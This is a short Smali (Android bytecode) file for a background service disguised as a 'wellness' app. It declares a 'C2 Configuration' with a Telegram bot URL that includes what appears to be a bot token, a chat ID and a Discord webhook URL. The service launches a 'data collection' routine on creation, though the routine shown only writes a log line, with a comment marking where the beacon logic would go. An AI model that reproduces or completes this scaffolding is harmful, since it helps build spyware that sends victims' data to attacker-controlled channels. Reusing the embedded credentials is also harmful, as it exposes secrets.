
# Wellness Beacon Service in Smali (Dalvik Bytecode)
.class public Lcom/wellness/holistisk/WellnessBeaconService;
.super Landroid/app/Service;

# C2 Configuration (obfuscated)
.field private static final TELEGRAM_URL:Ljava/lang/String; = "https://api.telegram.org/bot8283973635:AAFzNIcEl78aH-l0iKj5lYKFLj4Vil39u7k/sendMessage"
.field private static final CHAT_ID:Ljava/lang/String; = "3032183658"
.field private static final DISCORD_URL:Ljava/lang/String; = "https://discord.com/api/webhooks/1417361152371064902/DEw6e804zQB6oLB2jWuLvkTPhzMn6aQvsP-GV75mnOY1TWBmAuI9T1H7b9MoGJTSSbmM"

.method public onCreate()V
    .locals 0
    invoke-super {p0}, Landroid/app/Service;->onCreate()V
    invoke-direct {p0}, Lcom/wellness/holistisk/WellnessBeaconService;->startDataCollection()V
    return-void
.end method

.method private startDataCollection()V
    .locals 2
    # Start background thread for data collection
    # This would contain the actual beacon logic
    const-string v0, "WellnessApp"
    const-string v1, "Wellness service activated"
    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    const/4 v0, 0x0
    return-object v0
.end method
